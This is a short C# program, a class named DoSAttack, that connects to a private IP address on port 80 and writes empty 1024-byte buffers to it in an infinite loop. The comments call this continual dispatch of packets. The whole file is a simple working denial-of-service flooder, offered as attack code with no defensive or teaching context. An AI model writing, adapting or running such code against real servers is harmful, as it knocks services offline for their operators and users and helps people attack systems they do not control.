using System;
using System.Net.Sockets;

public class DoSAttack {
public static void Main(string[] args) {
TcpClient client = new TcpClient();

try {
client.Connect("192.168.1.123", 80); // Establish connection to target IP and port
} catch (Exception) {
Console.WriteLine("Connection unsuccessful!");
return;
}

NetworkStream stream = client.GetStream();

while(true) {
byte[] buffer = new byte[1024];
stream.Write(buffer, 0, buffer.Length); // Continual dispatch of packets
}
}
}